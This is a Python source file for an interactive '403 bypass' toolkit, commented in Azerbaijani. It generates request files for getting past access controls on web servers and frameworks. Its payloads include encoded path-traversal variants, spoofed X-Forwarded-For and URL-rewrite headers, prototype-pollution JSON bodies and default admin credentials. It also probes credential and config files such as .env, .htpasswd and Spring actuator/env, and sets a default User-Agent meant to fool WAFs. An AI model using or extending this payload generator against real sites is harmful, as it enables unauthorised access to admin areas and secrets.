#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
403 BYPASS TOOL KIT - Multi-Server / Multi-Framework Edition
=============================================================
Müəllif: Məmməd Əhmədov
GitHub: github.com/ahmadovmammad33-ux
"""

import os
import sys
from abc import ABC, abstractmethod

# ============================================================
# 1. KOSMİK BANNER
# ============================================================

def print_banner():
    author_name = "Məmməd Əhmədov"
    github_handle = "ahmadovmammad33-ux"
    
    banner = rf"""
          .  *  .    .  *       .  *  .
       *      .  *      .     *      .  *
     .  *   .      .  *     .  *   .      .
    .    .  *  .    .    .    .  *  .    .
       __
     _/o \_      ╔══════════════════════════════════╗
    ( \_  / )    ║                                  ║
  / / \ \ \ \    ║        403 BYPASS TOOL KIT       ║
  \_) (_/ (_/    ║    Multi-Server / Framework      ║
                 ╠══════════════════════════════════╣
                 ║  Author : {author_name:<20}   ║    
                 ║  GitHub : {github_handle:<20}   ║
                 ╚══════════════════════════════════╝
    """
    print(banner)


# ============================================================
# 2. SERVER GENERATOR-LARI
# ============================================================

class BaseServerGenerator(ABC):
    name = "base"
    description = "Ümumi bypass-lar"

    def __init__(self, target_path):
        self.path = target_path if target_path.startswith('/') else '/' + target_path

    @abstractmethod
    def generate_paths(self): pass

    def generate_headers(self):
        return [
            f"X-Original-URL: {self.path}", f"X-Rewrite-URL: {self.path}",
            "X-Forwarded-For: 127.0.0.1", "X-Forwarded-Host: 127.0.0.1",
            "X-Client-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
            "X-Host: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1", "X-Remote-Addr: 127.0.0.1",
            "X-Forwarded-For: localhost", "X-Forwarded-Host: localhost",
            "X-Host: localhost", "X-Forwarded-For: 0",
            "X-Forwarded-For: 0.0.0.0", "X-Forwarded-For: [::1]",
            "X-Forwarded-For: 127.0.0.1:80", "X-Forwarded-For: 127.0.0.1, 127.0.0.1",
            "X-Rewrite-URL: /",
        ]

    def generate_common_paths(self):
        p = self.path
        return [
            p, p + '/', p + '/.', p + '/..', p + '/../', p + '/./',
            '//' + p.lstrip('/'), '///' + p.lstrip('/'),
            p + '?', p + '??', p + '#', p + '?x=1',
            p + '%20', p + '%09', p + '%0a', p + '%0d%0a',
            p + '%00', p + '%00.html', p + '%00.php',
        ]

    def all_payloads(self):
        combined = self.generate_common_paths() + self.generate_paths()
        seen = set()
        return [item for item in combined if not (item in seen or seen.add(item))]

    def generate_body_params(self): return []


class NginxGenerator(BaseServerGenerator):
    name = "nginx"
    description = "Nginx (try_files, location regex bypass)"
    def generate_paths(self):
        p = self.path
        return [p + '/;', p + ';/', p + ';../', p.replace('/', '/.;/'), p.replace('/', '/;../'),
                p.replace('/', '%2f'), p.replace('/', '%2F'), p.replace('/', '%252f'),
                p.replace('.', '%2e'), p.replace('.', '%252e'), p + '/..;', p + '/..%3b',
                p + '/%2e%2e/', p + '/%2e%2e%2f', p.upper(), p.lower(), p.replace('/admin', '/AdMiN')]
    def generate_body_params(self):
        return ["admin=1", "role=admin", "is_admin=true", "user_id=1", "id=1",
                '{"admin": true}', '{"role": "admin"}', '{"is_admin": 1}', '{"user_id": 1}',
                "username=admin&password=admin", "login=admin&pass=admin"]

class ApacheGenerator(BaseServerGenerator):
    name = "apache"
    description = "Apache (.htaccess, mod_rewrite, MultiViews)"
    def generate_paths(self):
        p = self.path
        return [p + '/~', p + '/~.', p + '.php', p + '.php.', p + '.html', p + '/;/',
                p.replace('/', '//'), p.replace('/', '/./'), p + '/.htaccess', p + '/.htpasswd',
                p + '/..%2f', p + '/..%5c', p + '/index', p + '/index.php']
    def generate_body_params(self):
        return ["admin=1", "role=admin", "is_admin=true", "user_id=1", '{"admin": true}',
                '{"role": "admin"}', '{"is_admin": 1}', "username=admin&password=admin",
                "login=admin&pass=admin", "action=login&user=admin"]

class IISGenerator(BaseServerGenerator):
    name = "iis"
    description = "Microsoft IIS (case-insensitive, NTFS ADS, WebDAV)"
    def generate_paths(self):
        p = self.path
        return [p.upper(), p.lower(), p.replace('/admin', '/AdMiN'), p.replace('/admin', '/ADMIN'),
                p + '::', p + '::x', p + '::$DATA', p + '::x::$DATA', p + '/(1)', p + '/(2)',
                p + '/(a)', p + '/..%5c', p + '/..%c0%af', p + '/..%c1%9c', p + '/_vti_bin/',
                p + '/_layouts/', p + '.aspx', p + '.ashx', p + '.asmx', p + '.config']
    def generate_body_params(self):
        return ['<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:prop><D:getcontentlength/></D:prop></D:propfind>',
                '<?xml version="1.0"?><D:copy xmlns:D="DAV:"><D:dest>http://localhost/admin/</D:dest></D:copy>',
                '<propfind xmlns="DAV:"><prop><getcontentlength/></prop></propfind>',
                "admin=1", "role=admin", '{"admin": true}', '{"role": "admin"}']

class TomcatGenerator(BaseServerGenerator):
    name = "tomcat"
    description = "Apache Tomcat (jsessionid, ..;/, PUT bypass)"
    def generate_paths(self):
        p = self.path
        return [p + ';jsessionid=test', p + ';JSESSIONID=test', p + ';x=y', p + ';/', p + ';../',
                p.replace('/', '/;x=y/'), p + '/..;/', p + '/..%3b/', p + '/..%253b/',
                p.replace('/', '%2f'), p.replace('/', '%2F'), p.replace('/', '%252f'),
                p.upper(), p.lower(), p + '%00', p + '%00.jsp', p + '.jsp']
    def generate_body_params(self):
        return ["admin=true", "role=ADMIN", "is_admin=1", "user_id=1",
                "username=admin&password=admin", "j_username=admin&j_password=admin",
                '{"admin": true}', '{"role": "ADMIN"}', '{"is_admin": 1}', "action=login&user=admin"]

class NodeGenerator(BaseServerGenerator):
    name = "node"
    description = "Node.js / Express (query trick, prototype bypass)"
    def generate_paths(self):
        p = self.path
        return [p + '?', p + '?#', p + '#', p + '&', p + '?a=b', p + '?admin=1', p + '/?', p + '/#',
                p.upper(), p.lower(), p.replace('/', '%2f'), p.replace('/', '%2F'), p.replace('/', '%252f'),
                p + '%00', p + '%0a', p + '%0d%0a', p + '/', p + '//', p + '/.', p + '/..', p + '/./', p.replace('/admin', '/Admin')]
    def generate_body_params(self):
        return ['{"__proto__": {"admin": true}}', '{"__proto__": {"role": "admin"}}',
                '{"constructor": {"prototype": {"admin": true}}}', '{"admin": true}',
                '{"role": "admin"}', '{"is_admin": 1}', '{"user": {"role": "admin"}}',
                "admin=1", "role=admin", "is_admin=true"]

class CloudflareGenerator(BaseServerGenerator):
    name = "cloudflare"
    description = "Cloudflare / Universal WAF (unicode, encoding)"
    def generate_paths(self):
        p = self.path
        return [p.replace('a', '\u0430'), p.replace('e', '\u0435'), p.replace('o', '\u043e'),
                p.replace('/', '\uff0f'), p.replace('/', '%c0%af'), p.replace('/', '%e0%80%af'),
                p.replace('/', '%f0%80%80%af'), p.replace('/', '%252f'), p.replace('/', '%25%32%66'),
                p.replace('/', '/%2f'), p.replace('/', '%2f/'), p.upper().replace('/', '%2f'),
                p.lower().replace('/', '%2F'), p + '/.', p + '/..', p + '/;', p + '/%00', p + '%09']
    def generate_body_params(self):
        return ['{"admin": true}', '{"role": "admin"}', '{"is_admin": 1}', '{"user": {"role": "admin"}}',
                "admin=1", "role=admin", "is_admin=true", '{"admin": true, "role": "admin"}']

class UnknownGenerator(BaseServerGenerator):
    name = "unknown"
    description = "Server tipi naməlum - bütün bypass-ların union-u"
    def generate_paths(self):
        all_paths = []
        for cls in [NginxGenerator, ApacheGenerator, IISGenerator, TomcatGenerator, NodeGenerator, CloudflareGenerator]:
            all_paths.extend(cls(self.path).generate_paths())
        return all_paths
    def generate_body_params(self):
        all_bodies = []
        for cls in [NginxGenerator, ApacheGenerator, IISGenerator, TomcatGenerator, NodeGenerator, CloudflareGenerator]:
            all_bodies.extend(cls(self.path).generate_body_params())
        return list(set(all_bodies))


# ============================================================
# 3. FRAMEWORK GENERATOR-LARI
# ============================================================

class BaseFrameworkGenerator(ABC):
    name = "base"
    description = "Framework xüsusi payload-lar"
    def __init__(self, target_path):
        self.path = target_path if target_path.startswith('/') else '/' + target_path
    @abstractmethod
    def generate_paths(self): pass
    def generate_headers(self): return []
    @abstractmethod
    def generate_body_params(self): pass


class LaravelGenerator(BaseFrameworkGenerator):
    name = "laravel"
    description = "Laravel (public/ bypass, route middleware)"
    def generate_paths(self):
        p = self.path
        return ['/index.php' + p, '/index.php/' + p.lstrip('/'), '/public' + p, '/public/' + p.lstrip('/'),
                '/../' + p.lstrip('/'), '/../../' + p.lstrip('/'), '/index.php/../' + p.lstrip('/'),
                '/.env', '/config/app.php', '/config/database.php', '/storage/logs/laravel.log',
                '/vendor/autoload.php', '/bootstrap/cache/config.php', p + '?user_id=1', p + '?id=1',
                p + '?role=admin', p + '?is_admin=1', p.replace('/admin', '/api/admin'), p.replace('/admin', '/web/admin')]
    def generate_headers(self):
        return ["X-HTTP-Method-Override: GET", "X-HTTP-Method-Override: POST", "X-HTTP-Method-Override: PUT", "X-Method-Override: GET"]
    def generate_body_params(self):
        return ["_method=GET", "_method=POST", "_method=PUT", "_method=PATCH", "_method=DELETE",
                "role=admin", "is_admin=1", "admin=1", "user_id=1", '{"role": "admin"}',
                '{"is_admin": 1}', '{"admin": true}', "username=admin&password=admin"]

class DjangoGenerator(BaseFrameworkGenerator):
    name = "django"
    description = "Django (admin bypass, query trick)"
    def generate_paths(self):
        p = self.path
        return [p + '?', p + '/?', p + '/..', p + '/.', '/admin/' + p.lstrip('/'), p.replace('/admin', '/Admin'), p + '?redirect=/admin/', p + '?next=/admin/']
    def generate_body_params(self):
        return ["csrfmiddlewaretoken=x", "is_staff=1", "is_superuser=1", "username=admin&password=admin",
                "login=admin&password=admin", '{"is_staff": true}', '{"is_superuser": true}', '{"username": "admin"}']

class SpringGenerator(BaseFrameworkGenerator):
    name = "spring"
    description = "Spring / Java (Actuator, method override)"
    def generate_paths(self):
        p = self.path
        return [p + '/actuator', p + '/actuator/env', p + '/actuator/health', '/.well-known/actuator', p + '/;/', p + '/..;/', p + '/%2e%2e;/', p + '/..%3b/']
    def generate_headers(self): return ["X-HTTP-Method-Override: GET", "X-HTTP-Method-Override: POST"]
    def generate_body_params(self):
        return ['{"admin": true}', '{"role": "ADMIN"}', 'admin=true', 'role=ADMIN', 'is_admin=1', 'user_id=1', '{"username": "admin"}']

class ExpressGenerator(BaseFrameworkGenerator):
    name = "express"
    description = "Express.js (route mounting, prototype trick)"
    def generate_paths(self):
        p = self.path
        return [p + '?#', p + '&', p + '?admin=1', p + '/?', p + '/#', p.replace('/admin', '/Admin'), p + '/__proto__', p + '/constructor']
    def generate_body_params(self):
        return ['{"__proto__": {"admin": true}}', '{"__proto__": {"role": "admin"}}',
                '{"constructor": {"prototype": {"admin": true}}}', '{"admin": true}',
                '{"role": "admin"}', '{"is_admin": 1}', '{"user": {"role": "admin"}}', "admin=1", "role=admin"]


# ============================================================
# 4. HTTP METHOD HANDLER
# ============================================================

SUPPORTED_METHODS = {
    "GET":     {"body": False, "description": "Sadə oxuma sorğusu"},
    "POST":    {"body": True,  "description": "Məlumat göndərmə"},
    "PUT":     {"body": True,  "description": "Tam yeniləmə"},
    "PATCH":   {"body": True,  "description": "Qismən yeniləmə"},
    "DELETE":  {"body": False, "description": "Silinmə"},
    "HEAD":    {"body": False, "description": "Yalnız header cavabı"},
    "OPTIONS": {"body": False, "description": "CORS preflight"},
    "TRACE":   {"body": False, "description": "Debug method (XST riski)"},
    "CONNECT": {"body": False, "description": "Proxy tunnel"},
    "PROPFIND":{"body": True,  "description": "WebDAV (IIS/Apache)"},
    "COPY":    {"body": True,  "description": "WebDAV (Fayl kopyalama)"},
    "MOVE":    {"body": False, "description": "WebDAV"},
}


# ============================================================
# 5. BURP REQUEST BUILDER (User-Agent Dəstəyi ilə)
# ============================================================

class BurpRequestBuilder:
    def __init__(self, host, user_agent, port=80, scheme="http"):
        self.host = host
        self.user_agent = user_agent
        self.port = port
        self.scheme = scheme

    def build(self, method, path, extra_headers=None, body=None):
        lines = [f"{method} {path} HTTP/1.1"]
        lines.append(f"Host: {self.host}")
        lines.append(f"User-Agent: {self.user_agent}") # DİNAMİK USER-AGENT
        lines.append("Accept: */*")
        lines.append("Connection: close")

        if extra_headers:
            for h in extra_headers:
                if ':' in h: lines.append(h)

        if body:
            lines.append(f"Content-Length: {len(body)}")
            if body.strip().startswith('{'):
                lines.append("Content-Type: application/json")
            elif body.strip().startswith('<'):
                lines.append("Content-Type: application/xml")
            else:
                lines.append("Content-Type: application/x-www-form-urlencoded")

        lines.append("") # BLANK LINE
        if body: lines.append(body)

        return "\r\n".join(lines) + "\r\n"


# ============================================================
# 6. MAIN TOOL (Interaktiv CLI)
# ============================================================

SERVERS = {
    "nginx": NginxGenerator, "apache": ApacheGenerator, "iis": IISGenerator,
    "tomcat": TomcatGenerator, "node": NodeGenerator, "cloudflare": CloudflareGenerator,
    "unknown": UnknownGenerator,
}

FRAMEWORKS = {
    "laravel": LaravelGenerator, "django": DjangoGenerator,
    "spring": SpringGenerator, "express": ExpressGenerator, "none": None,
}

# Default Real Brauzer User-Agent (WAF-ları aldatmaq üçün)
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"


def ask_path():
    while True:
        p = input("\n[?] Hədəf path (məs: /administrator/user/login/): ").strip()
        if p: return p if p.startswith('/') else '/' + p
        print("[!] Boş ola bilməz, zəhmət olmasa path daxil edin.")

def ask_method():
    print("\n[?] HTTP Method seçin:")
    print("    ALL        - Bütün methodlar üçün payload yaradılır (Tövsiyə olunur)")
    for m, info in SUPPORTED_METHODS.items(): 
        print(f"    {m:<10} - {info['description']}")
    
    while True:
        m = input("[?] Method (bilmirsinizsə 'none' və ya 'ALL' yazın, default ALL): ").strip().upper() or "ALL"
        if m in ["NONE", "YOX", ""]:
            m = "ALL"
        if m == "ALL" or m in SUPPORTED_METHODS: 
            return m
        print("[!] Naməlum seçim. Zəhmət olmasa  siyahıdan bir method seçin.")

def ask_server():
    print("\n[?] Server tipi seçin:")
    for k, cls in SERVERS.items(): print(f"    {k:<12} - {cls.description}")
    while True:
        s = input("[?] Server (yoxdursa 'none' yazın, default unknown): ").strip().lower() or "unknown"
        if s in SERVERS: return s
        print("[!] Naməlum server. 'unknown' və ya siyahıdan birini seçin.")

def ask_framework():
    print("\n[?] Framework seçin:")
    for k, cls in FRAMEWORKS.items():
        desc = cls.description if cls else "Framework yoxdur"
        print(f"    {k:<10} - {desc}")
    while True:
        f = input("[?] Framework (yoxdursa 'none' yazın, default none): ").strip().lower() or "none"
        if f in FRAMEWORKS: return f
        print("[!] Naməlum framework. 'none' və ya siyahıdan birini seçin.")

def ask_user_agent():
    """İstifadəçidən User-Agent soruşur, boş buraxarsa real brauzer UA-sı qoyur."""
    print(f"\n[?] User-Agent seçin:")
    print(f"    (Boş buraxsanız və ya 'none' yazsanız, avtomatik real Chrome UA-sı istifadə olunacaq)")
    h = input("[?] User-Agent (yoxdursa 'none' yazın): ").strip()
    if not h or h.lower() == "none":
        return DEFAULT_UA
    return h

def ask_host():
    h = input("\n[?] Hədəf host (məs: example.com, yoxdursa 'none' yazın, default none): ").strip()
    return h if h else "none"


def generate_and_save(path, method_input, server_key, framework_key, host, user_agent):
    server_gen = SERVERS[server_key](path)
    fw_gen = FRAMEWORKS[framework_key](path) if framework_key != "none" else None

    paths = server_gen.all_payloads()
    if fw_gen: paths.extend(fw_gen.generate_paths())
    paths = list(dict.fromkeys(paths))

    headers = server_gen.generate_headers()
    if fw_gen: headers.extend(fw_gen.generate_headers())
    headers = list(dict.fromkeys(headers))

    body_params = server_gen.generate_body_params()
    if fw_gen: body_params.extend(fw_gen.generate_body_params())
    body_params = list(dict.fromkeys(body_params))

    methods_to_use = list(SUPPORTED_METHODS.keys()) if method_input == "ALL" else [method_input]

    builder = BurpRequestBuilder(host, user_agent) # User-Agent ötürülür
    full_requests = []
    
    for current_method in methods_to_use:
        for p in paths: full_requests.append(builder.build(current_method, p))
        for h in headers: full_requests.append(builder.build(current_method, path, extra_headers=[h]))
        for b in body_params: full_requests.append(builder.build(current_method, path, body=b))

    os.makedirs("output", exist_ok=True)
    prefix = f"{server_key}_{framework_key}"

    files = {
        f"output/{prefix}_paths.txt": paths,
        f"output/{prefix}_headers.txt": headers,
        f"output/{prefix}_body.txt": body_params,
    }

    for fname, content in files.items():
        with open(fname, "w", encoding="utf-8") as f:
            for line in content: f.write(line + "\n")

    req_dir = f"output/{prefix}_requests"
    os.makedirs(req_dir, exist_ok=True)
    for i, req in enumerate(full_requests, 1):
        with open(os.path.join(req_dir, f"req_{i:04d}.txt"), "w", encoding="utf-8") as f:
            f.write(req)

    with open(f"output/{prefix}_all_requests.txt", "w", encoding="utf-8") as f:
        for i, req in enumerate(full_requests, 1):
            f.write(f"\n# {'='*45} REQUEST #{i} {'='*45}\n\n")
            f.write(req)
            f.write("\n")

    method_display = "ALL (Bütün methodlar)" if method_input == "ALL" else method_input
    print("\n" + "=" * 65)
    print("[✓] GENERATOR TAMAMLANDI")
    print("=" * 65)
    print(f"  Server    : {server_key}")
    print(f"  Framework : {framework_key}")
    print(f"  Method    : {method_display}")
    print(f"  Path      : {path}")
    print(f"  User-Agent: {user_agent[:50]}{'...' if len(user_agent)>50 else ''}")
    print("-" * 65)
    print(f"  Path payload-ları   : {len(paths):>4}  -> {prefix}_paths.txt")
    print(f"  Header payload-ları : {len(headers):>4}  -> {prefix}_headers.txt")
    print(f"  Body payload-ları   : {len(body_params):>4}  -> {prefix}_body.txt")
    print(f"  Tam HTTP request    : {len(full_requests):>4}  -> {req_dir}/")
    print(f"  Birləşmiş request   : {len(full_requests):>4}  -> {prefix}_all_requests.txt")
    print("=" * 65)


def main():
    print_banner()
    try:
        path = ask_path()
        method = ask_method()
        server_key = ask_server()
        framework_key = ask_framework()
        user_agent = ask_user_agent() 
        host = ask_host()
        generate_and_save(path, method, server_key, framework_key, host, user_agent)
    except KeyboardInterrupt:
        print("\n[!] İstifadəçi dayandırdı.")
        sys.exit(0)

if __name__ == "__main__":
    main()